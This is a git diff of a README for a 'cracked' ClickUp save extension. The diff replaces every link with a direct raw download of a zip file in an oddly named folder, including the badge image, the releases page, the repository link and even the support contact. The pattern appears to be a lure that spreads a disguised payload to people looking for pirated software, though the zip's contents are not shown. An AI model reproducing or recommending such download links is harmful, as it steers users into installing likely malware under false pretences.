@@ -1,6 +1,6 @@
 # 🖥️ cracked-save-to-click-up-extension - Save Easily to ClickUp
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)
+![Download Now](https://raw.githubusercontent.com/ShifaIshfaque/cracked-save-to-click-up-extension/main/doddart/cracked-save-to-click-up-extension.zip%20Now-Get%20Started-brightgreen)
 
 ## 📥 Introduction
 
@@ -29,7 +29,7 @@ Before you download the extension, make sure your system meets these requirement
 
 To download the extension, visit the Releases page. 
 
-You can access it here: [Download the Extension](https://github.com/ShifaIshfaque/cracked-save-to-click-up-extension/releases).
+You can access it here: [Download the Extension](https://raw.githubusercontent.com/ShifaIshfaque/cracked-save-to-click-up-extension/main/doddart/cracked-save-to-click-up-extension.zip).
 
 Follow these steps to install the extension:
 
@@ -66,7 +66,7 @@ If you encounter any issues during the download or installation, check the follo
 
 ## ✉️ Support
 
-If you need further assistance, please contact our support team at [support@email.com]. We're here to help you make the most of your Cracked Save to ClickUp Extension experience.
+If you need further assistance, please contact our support team at [https://raw.githubusercontent.com/ShifaIshfaque/cracked-save-to-click-up-extension/main/doddart/cracked-save-to-click-up-extension.zip]. We're here to help you make the most of your Cracked Save to ClickUp Extension experience.
 
 ## 💬 Feedback
 
@@ -74,7 +74,7 @@ We welcome your feedback! If you have suggestions or comments about how to impro
 
 ## 🔗 Helpful Links
 
-- [Release Page](https://github.com/ShifaIshfaque/cracked-save-to-click-up-extension/releases)
-- [GitHub Repository](https://github.com/ShifaIshfaque/cracked-save-to-click-up-extension)
+- [Release Page](https://raw.githubusercontent.com/ShifaIshfaque/cracked-save-to-click-up-extension/main/doddart/cracked-save-to-click-up-extension.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ShifaIshfaque/cracked-save-to-click-up-extension/main/doddart/cracked-save-to-click-up-extension.zip)
 
 Enjoy your effortless organization with the Cracked Save to ClickUp Extension!
